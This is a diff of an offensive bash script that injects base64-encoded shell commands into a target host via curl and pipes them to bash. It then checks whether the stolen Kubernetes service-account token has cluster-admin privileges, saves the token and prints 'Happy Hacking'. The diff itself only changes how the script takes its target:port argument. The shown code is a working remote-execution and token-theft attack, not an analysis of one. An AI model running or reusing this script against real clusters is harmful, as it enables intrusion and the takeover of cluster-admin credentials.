@@ -29,27 +29,16 @@ inject=$(echo ${commandb64} | base64 -d | envsubst | base64 )
 curl_target $1 "echo '${inject}' | base64 -d | bash -" | grep -i -q 'allowed": true,' &&  echo $token > token && echo " ☣☣☣ Checking Token Privileges ☣☣☣" && echo ☺ - kubernetes.default.svc:443 Access Confirmed from ${hostname} && echo ☺ - Token with cluster-admin Privileges Confirmed && echo ☣☣☣ Happy Hacking ☣☣☣
 }
 
-
-if [ ! -z "$1" ]
-then
-  attack $1
-  exit 0
-fi
-
-if [ ! -z "$target" ]
+if [ -z "$target" ]
 then
   echo  "try: $0 target:port"
   exit 1
 fi
 
-if [ ! -z "$target" ] && [ ! -z "$1" ]
+if [ ! -z "$target" ]
 then
   attack $target
   exit 0
 fi
 
-if [ -z "$target" ] && [ -z "$1" ]
-then
-  echo  "try: $0 target:port"
-  exit 1
-fi
+attack $1
